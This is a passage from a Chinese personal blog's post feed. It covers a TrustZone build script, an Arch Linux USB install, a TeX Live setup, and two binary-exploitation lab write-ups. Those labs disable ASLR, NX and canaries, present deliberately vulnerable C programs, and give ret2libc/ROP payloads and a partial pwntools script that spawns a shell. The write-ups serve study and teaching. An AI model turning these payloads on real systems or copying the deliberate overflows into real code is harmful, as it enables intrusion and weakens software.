class="token operator">=</span> target_name<span class="token punctuation">,</span>  deploy_sources <span class="token operator">=</span> sources <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token string">'SConscript'</span><span class="token punctuation">]</span> <span class="token operator">+</span> deploy_header_files<span class="token punctuation">)</span><span class="token keyword">for</span> image <span class="token keyword">in</span> env<span class="token punctuation">[</span><span class="token string">'IMAGE_ALIASES'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  op <span class="token operator">=</span> env<span class="token punctuation">.</span>Alias<span class="token punctuation">(</span>image<span class="token punctuation">,</span> helloCA_units<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  配置文件build&#x2F;ms路径下build_config.xml中 &lt;target name&#x3D;”common”&gt; 标签下添加</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>helloCA<span class="token punctuation">"</span></span>      <span class="token attr-name">recompile</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifact</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>helloCA<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapreport</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>core/bsp/trustzone/qsapps<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>USES_FLAGS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>USES_NO_CP<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相同路径下新建编译脚本helloCA.sh:</p><pre class="line-numbers language-sh"><code class="language-sh">python build_all.py -b TZ.BF.4.0 CHIPSET=sdm660 helloCA -cpython build_all.py -b TZ.BF.4.0 CHIPSET=sdm660 helloCA#:<<!adb shell mount /firmware -o rw,remount# echo "start push smplap32...... goodixfp"# find /home/yin/TZ.BF.4.0.7/trustzone_images/build/ms/bin/PIL_IMAGES/SPLITBINS_KAJAANAA/ -maxdepth 1 -name "smplap32.*" -exec adb -s f7a66acc push &#123;&#125; /firmware/image/ \;# echo "push finished !" #cat /sys/kernel/debug/tzdbg/qsee_logecho "start push helloCA......"for f in /home/yin/Documents/TZ.BF.4.0.7/trustzone_images/build/ms/bin/PIL_IMAGES/SPLITBINS_KAJAANAA/helloCA.*do    echo $f    adb -s f7a66acc push $f /firmware/image/doneecho "push finished !"#!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> trustZone </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>archLinux 安装到u盘</title>
      <link href="/2020/02/19/archLinux%20%E5%AE%89%E8%A3%85%E5%88%B0u%E7%9B%98/"/>
      <url>/2020/02/19/archLinux%20%E5%AE%89%E8%A3%85%E5%88%B0u%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Lenovo G510    ubuntu 18.04   8G u盘</p><p>启动方式：legacy bios  非 UEFI</p></blockquote><h2 id="virtualBox"><a href="#virtualBox" class="headerlink" title="virtualBox"></a>virtualBox</h2><ol><li>下载<a href="https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/">archlinux镜像</a> , virtualBox中新建archlinux虚拟机</li></ol><p>PS：virtualBox u盘识别需要</p><pre><code>usermod -a -G vboxusers $USER# 重启系统</code></pre><p>​    在Ubuntu Host中 ssh连接 archlinux虚拟机：</p><span id="more"></span><pre><code># 在archlinux中systemctl start sshdpasswd   #设置密码# virtualBox 网络配置中设置端口转发规则主机   1111       客户机    22# 在ubuntu 中ssh -l root 127.0.0.1 -p 1111</code></pre><h2 id="U-盘"><a href="#U-盘" class="headerlink" title="U 盘"></a>U 盘</h2><ol><li><strong>分区</strong>      在archlinux 中</li></ol><pre><code>lsblk   # 查看u盘盘符，假设为sdbfdisk /dev/sdb主要选项：o boot分区：n       +128M 根分区：n 其余默认 写入修改：w 打印: p</code></pre><ol start="2"><li><strong>格式化</strong></li></ol><pre><code>mkfs.fat -F32 /dev/sdb1mkfs.ext4 /dev/sdb2</code></pre><ol start="3"><li><strong>挂载</strong></li></ol><pre><code>mount /dev/sdb2 /mnt</code></pre><h2 id="ArchLinux"><a href="#ArchLinux" class="headerlink" title="ArchLinux"></a>ArchLinux</h2><ol><li><strong>安装</strong></li></ol><pre><code># 修改软件源为国内源cd /etc/pacman.dcp mirrorlist mirrorlist.bkcat mirrorlist.bk | grep China -A 1 | grep -v &#39;-&#39; &gt; mirrorlistpacstrap /mnt base base-devel linux linux-firmware dhcpcdgenfstab -L /mnt &gt;&gt; /mnt/etc/fstab</code></pre><ol start="2"><li><strong>配置</strong></li></ol><pre><code>#进入u盘archlinuxarch-chroot /mnt# 密码passwd# 时间ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc# 基础软件pacman -S vim dialog wpa_supplicant ntfs-3g networkmanager# 语言vim /etc/locale.gen  # 取消en_US.UTF-8 zh_CN.UTF-8的注释locale-genvim /etc/locale.conf  # 添加 LANG=en_US.UTF-8# 主机名echo &#39;myhostname&#39; &gt; /etc/hostname# hostsvim /etc/hosts# 添加内容             127.0.0.1localhost            ::1localhost            127.0.1.1myhostname.localdomainmyhostname</code></pre><ol start="3"><li><strong>引导</strong></li></ol><pre><code>pacman -S intel-ucode os-prober ntfs-3g grubgrub-install --target=i386-pc /dev/sdbgrub-mkconfig -o /boot/grub/grub.cfg</code></pre><ol start="4"><li><strong>收工</strong></li></ol><pre><code>exitumount /mnt</code></pre><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>重启，Fn + F12选择启动介质  或 Fn+F2进入Bios选择leagcy First, 并调整u盘为第一个 即可进入u盘的archlinux系统，经测试 编辑的文件会保留， 重启后再进入文件仍在。</p><p>8G u盘过小，无法安装图形界面。可选用32G 等</p><p>参考：</p><p><a href="https://www.viseator.com/2017/05/17/arch_install/">viseator大神的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> arch linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu搭建TexLive环境写slide</title>
      <link href="/2018/05/08/ubuntu%E6%90%AD%E5%BB%BATexLive%E7%8E%AF%E5%A2%83%E5%86%99slide/"/>
      <url>/2018/05/08/ubuntu%E6%90%AD%E5%BB%BATexLive%E7%8E%AF%E5%A2%83%E5%86%99slide/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul><li>想做ppt，但几次ppt演示时出现兼容问题，于是想尝试格式稳定的<code>beamer</code> 做<code>ppt</code> 。</li><li>本机空间不足，<code>apt-get install</code> 命令无法指定安装路径，于是挂载了一个硬盘，手动下载后安装，空间充足可<code>sudo apt install texlive-full texstudio</code> 一行命令解决。</li></ul><h3 id="texlive安装"><a href="#texlive安装" class="headerlink" title="texlive安装"></a>texlive安装</h3><ol><li>进入准备安装路径，使用更快的清华大学镜像源下载<code>texlive</code> 安装包：</li></ol><span id="more"></span><pre><code>$ cd /media/xsyin/extra$ wget https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/texlive2018.iso</code></pre><ol start="2"><li>单击挂载光盘，用浏览器打开主目录下的<code>index.html</code> ，找到<code>tex Live安装指南</code> ，或阅读<a href="http://tug.org/texlive/doc/texlive-zh-cn/texlive-zh-cn.pdf">网络版TEX Live安装指南</a> 。使用图形化安装，安装依赖：</li></ol><pre><code>$ sudo apt install perl-tk$ ./install-tl -gui=perltk</code></pre><p><img src="/install-lnx-main.png" alt="install-lnx-main"></p><p><code>Installation collections --&gt; change</code> 选择安装模块，去除一些用不着的语言<code>Cyrillic</code> 至<code>Spanish</code> ，选上<code>US and UK English</code> ：</p><p><img src="/stdcoll.png" alt="stdcoll"></p><p><code>TEXDIR --&gt;change</code> 修改为安装路径：<code>/media/xsyin/extra/texlive2018</code> ，其余默认，开始安装。</p><ol start="3"><li>配置环境变量，编辑<code>~/.bashrc</code>， 添加：</li></ol><pre><code>export PATH=$PATH:/media/xsyin/extra/texlive2018/bin/x86_64-linuxexport MANPATH=/media/xsyin/extra/texlive2018/texmf-dist/doc/man:$MANPATHexport INFOPATH=/media/xsyin/extra/texlive2018/texmf-dist/doc/info:$INFOPATH</code></pre><p><code>source ~/.bashrc</code> 启用配置。</p><ol start="4"><li>管理你的安装<code>tlmgr</code> ，设置清华大学开源仓库并更新，已安装<code>beamer</code>：</li></ol><pre><code>$ tlmgr option repository https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/tlnet$ tlmgr update -all$ tlmgr info beamer</code></pre><p>也可以<code>GUI</code> 模式启动： <code>tlmgr -gui</code></p><ol start="5"><li>测试安装是否成功：</li></ol><pre><code>$ tex --version$ latex sample2e.tex$ pdflatex sample2e.tex</code></pre><hr><h3 id="texstudio安装"><a href="#texstudio安装" class="headerlink" title="texstudio安装"></a>texstudio安装</h3><ul><li>texstudio 占用空间不大，使用<code>sudo apt install texstusio</code> 安装或在<a href="http://texstudio.sourceforge.net/">源码包下载页面</a> 选择对应的安装包，依赖不满足使用<code>sudo apt -f install</code> 安装。</li><li><code>texstudio</code> 打开，配置语言为中文.</li></ul><h3 id="beamer"><a href="#beamer" class="headerlink" title="beamer"></a>beamer</h3><ul><li>快速上手一般采用现成的模板，在texstudio中新建，复制以下最小模板，构建并查看：</li></ul><pre><code>%!TEX program = xelatex\documentclass&#123;beamer&#125;\usepackage&#123;xeCJK&#125;\usetheme&#123;Madrid&#125;\title[标题]&#123;完整标题&#125;\author[作者]&#123;完整作者&#125;\institute[单位]&#123;完整单位列表&#125;\date[日期]&#123;完整日期&#125;\begin&#123;document&#125;%------------------------------------------------\begin&#123;frame&#125;    \titlepage\end&#123;frame&#125;%------------------------------------------------\begin&#123;frame&#125;&#123;Outline&#125;    \tableofcontents\end&#123;frame&#125;%------------------------------------------------\section&#123;背景介绍&#125;\begin&#123;frame&#125;\frametitle&#123;中文&#125;\begin&#123;block&#125;&#123;模块&#125;内容    \begin&#123;itemize&#125;        \item 条目1    \end&#123;itemize&#125;\end&#123;block&#125;\end&#123;frame&#125;%------------------------------------------------\end&#123;document&#125;</code></pre><p>好了，现在可以开(ku) 心(bi)的写<code>slide</code> 了。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://zhenruichen.com/2015/09/02/Beamer-Chinese.html">Beamer 显示中文的模板</a></p>]]></content>
      
      
      <categories>
          
          <category> tex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2018/05/06/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2018/05/06/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<blockquote><p>基于64位ubuntu 16.04操作系统版本以及gcc,gdb版本如下：</p><p>Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p><p>gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609</p><p>GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</p></blockquote><span id="more"></span><hr><p>###准备工作 </p><p>为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p><ul><li>关闭<code>ASLR</code>(地址空间布局随机化):</li></ul><pre><code>echo 0 |sudo tee /proc/sys/kernel/randomize_va_space</code></pre><ul><li><code>Cannary</code>:开启<code>Cannary</code>之后，函数开始时在rbp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用<code>__stackchk_fail</code>函数，终止进程。对应GCC编译选项<code>-fno-stack-protector</code>解除该保护。</li><li><code>NX</code>:开启NX保护后，程序的堆栈将会不可执行，对应GCC编译选项<code>-z execstack</code>解除该保护。</li></ul><p>C语言栈帧结构如下：</p><p><img src="/c.jpg" alt="c"></p><h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>FILE<span class="token operator">*</span> g_fp<span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">read_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>               g_fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"../input/buffer_overflow_code_injection_write_file.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>g_fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open file failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fscanf</span><span class="token punctuation">(</span>g_fp<span class="token punctuation">,</span> <span class="token string">"\\x%02x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        buf<span class="token punctuation">[</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>     <span class="token function">fclose</span><span class="token punctuation">(</span>g_fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">read_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>分析漏洞代码， while循环出现栈溢出，读入文件中覆盖了rbp与返回地址，且修改其指向shellcode起始指令；</li><li>分析读入文件，即将返回地址处修改为shellcode首地址</li></ul><p><img src="/%E9%80%89%E5%8C%BA_037.png" alt="选区_037"></p><ul><li>编译：</li></ul><pre><code>gcc -g -z execstack -fno-stack-protector buffer_overflow_code_injection_write_file.c -o buffer_overflow</code></pre><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul><li>使用gdb调试运行：<code>gdb buffer_overflow</code></li></ul><p><img src="/%E9%80%89%E5%8C%BA_038.png" alt="选区_038"></p><p>​       由调试可知栈帧结构如图所示，因此栈溢出时会覆盖<code>length</code>值，即100后有覆盖为97,最终读入0x6d即109，刚好从rbp指向地址开始填充之后的8个0x61，之后填充返回地址，由图中分析可知该返回地址应改为<code>0x00007fffffffdab0</code>，小端模式，读入文件中\x20\x18改为\xb0\xda。重新调试：</p><p><img src="/%E9%80%89%E5%8C%BA_039.png" alt="选区_039"></p><p>成功跳入shellcode，继续运行：</p><p><img src="/%E9%80%89%E5%8C%BA_040.png" alt="选区_040"></p><p>正常退出，此时output文件夹已生成新文件：</p><p><img src="/%E9%80%89%E5%8C%BA_041.png" alt="选区_041"></p><p>在gdb调试环境下运行成功，但实际运行却出现段错误：</p><p><img src="/%E9%80%89%E5%8C%BA_042.png" alt="选区_042"></p><h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>​        经搜索查阅资料得知是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p><p> 要获取shellcode首条指令的地址，可以在程序中打印出length的地址加上4(length)+8(rbp)+8(返回地址)&#x3D;20,也可以利用内核转储获取真实地址。</p><p> 首先启用内核转储：ulimit -c unlimited，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p><p><img src="/%E9%80%89%E5%8C%BA_045.png" alt="选区_045"></p><p>由图中可知应把读入文件返回地址处改为：<code>\x40\xdb\xff\xff\xff\x7f\x00\x00</code>，再次运行：</p><p><img src="/%E9%80%89%E5%8C%BA_046.png" alt="选区_046"></p><p>正常环境下运行成功。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>复现关键点：</p><ul><li>关闭保护措施</li><li>找准rbp后保存返回地址的8个字节</li><li>确定shellcode的入口地址</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级栈溢出及ret2libc</title>
      <link href="/2018/05/05/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/"/>
      <url>/2018/05/05/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/</url>
      
        <content type="html"><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><blockquote><p>实验环境：uname -a    64位 ubuntu 16.04</p><p>Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p></blockquote><ul><li>gdb-peda</li></ul><pre><code>$ git clone https://github.com/longld/peda.git ~/peda$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit </code></pre><ul><li>pwntools</li></ul><pre><code>$ pip install pwn</code></pre><span id="more"></span><h3 id="三种保护机制"><a href="#三种保护机制" class="headerlink" title="三种保护机制"></a>三种保护机制</h3><ul><li><strong>ASLR</strong> ：地址空间随机化，每次运行函数地址改变。</li></ul><p>​        绕过：随机化只是将每次库函数加载地址随机，库函数间相对地址不变，因此通过GOT来泄漏库函数地址，  以推导出libc中其他函数（如system）的地址。</p><ul><li><strong>NX</strong> ：通过在页表上设置NX(不可执行）位，将非代码段的地址空间设置成不可执行属性，一旦系统从这些地址空间进行取指令时，CPU就是报内存违例异常，进而杀死进程。栈空间也被操作系统设置了不可执行属性，因此普通的<code>shellode</code>注入无法执行。</li></ul><p>​        绕过：<code>ret2libc</code> 利用已有代码，更改返回地址时返回到系统函数。</p><ul><li><strong>Cannary</strong>  ： 通过在缓冲区和返回地址间插入一个<code>canary word</code> ，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。</li></ul><p>​       暂时未研究如何绕过，因此使用<code>-fno-stack-protector</code> 标志关闭该安全保护机制。        </p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><strong>难点：</strong> </p><ol><li>由于ASLR机制，需要泄漏库函数地址以确定<code>system</code> 函数地址，本次结合<code>ROP</code> 使用<code>write</code> 函数获取<code>write</code> 函数实际地址。</li><li>由于操作环境为64位<code>linux</code> ，函数通过<code>rdi,rsi,rdx,rcx,r8,r9</code> 以及栈传参，因此采用<code>pop,ret</code> 片段装填参数</li></ol><p>​    本次实验结合了<code>ret2libc</code> 与<code>ROP</code> 两种手段，为简化操作，内置了需要的<code>gadget</code> 。</p><h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*************************************************************************    > File Name: vuln.c    > Author: xsyin    > Mail: shouyinXu@163.com     > Created Time: 2018年05月05日 星期六 14时24分14秒    > Make: gcc -fno-stack-protector -g vuln.c -o vuln ************************************************************************/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pop %rdi; pop %rsi; pop %rdx; ret"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Enter input: \n"</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>read</code> 函数中允许写入521字节到一个只有128字节的缓冲区，明显的缓冲区溢出利用点。</p><ul><li>寻找溢出点</li></ul><p><img src="/%E9%80%89%E5%8C%BA_065.png" alt="选区_065"></p><p><img src="/%E9%80%89%E5%8C%BA_066.png" alt="选区_066"></p><p>溢出点在偏移136处，即<code>buf</code> 填充136之后为返回地址。</p><ul><li>寻找需要的<code>gadget</code> 片段</li></ul><p><img src="/%E9%80%89%E5%8C%BA_067.png" alt="选区_067"></p><ul><li>构造<code>payload</code> ：</li></ul><pre><code>#payload1 获取write函数实际地址payload1 = &quot;A&quot; * 136  #截至返回地址前的缓冲区长度payload1 += p64(pppr) #跳转到PPPR指令序列，为write函数赋值payload1 += p64(0x1) #write函数的第一个参数，1表示输出到stdoutpayload1 += p64(got_write) #write函数的第二个参数，表示要输出字符串的首地址payload1 += p64(0x8) #write函数的第三个参数，表示要输出字符串的长度payload1 += p64(plt_write) #调用write函数payload1 += p64(vuln)      #继续调用vuln函数</code></pre><p>由于<code>linux</code> 共享库的延迟绑定技术，函数第一次调用时填充<code>GOT</code>表，在运行到<code>read</code> 函数时<code>write</code> 函数<code>GOT</code> 表中已填入实际地址。<code>payload1</code> 读取该地址。</p><pre><code>#payload2 跳转至库函数systempayload2 = &quot;A&quot; * 136   #截至返回地址前的缓冲区长度payload2 += p64(pr)   #跳转到PR指令序列，填充system的第一个参数payload2 += p64(binsh_addr)  #system函数的第一个参数/bin/shpayload2 += p64(systemAddr)    #调用system函数</code></pre><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/%E9%80%89%E5%8C%BA_068.png" alt="选区_068"></p><p>退出报错，可以通过PPPR片段再次跳转到<code>exit</code> 函数正常退出。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> <strong>优点：</strong>  通过<code>ret2libc</code> 与 <code>ROP</code> 绕过了ASLR与NX机制</p><p><strong>缺点：</strong> </p><ol><li><p>未绕过GS机制，可通过更改<code>__stackchk_fail__</code>函数<code>GOT</code> 表项</p></li><li><p>内置了需要的<code>gadget</code> ，可使用通用的片段，ret2csu</p></li><li><p>需要知道 <code>libc</code> 路径及版本，可通过pwntools提供的DynELF模块来进行内存搜索</p></li></ol><h3 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token comment" spellcheck="true"># file: exploit.py</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> structelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'vuln'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>pppr <span class="token operator">=</span> <span class="token number">0x4005ba</span>pr <span class="token operator">=</span> <span class="token number">0x400693</span>plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>got_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>libc_write <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>libc_system <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"libc_system: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_system<span class="token punctuation">)</span>vuln <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>payload1 <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">136</span>payload1 <span class="token 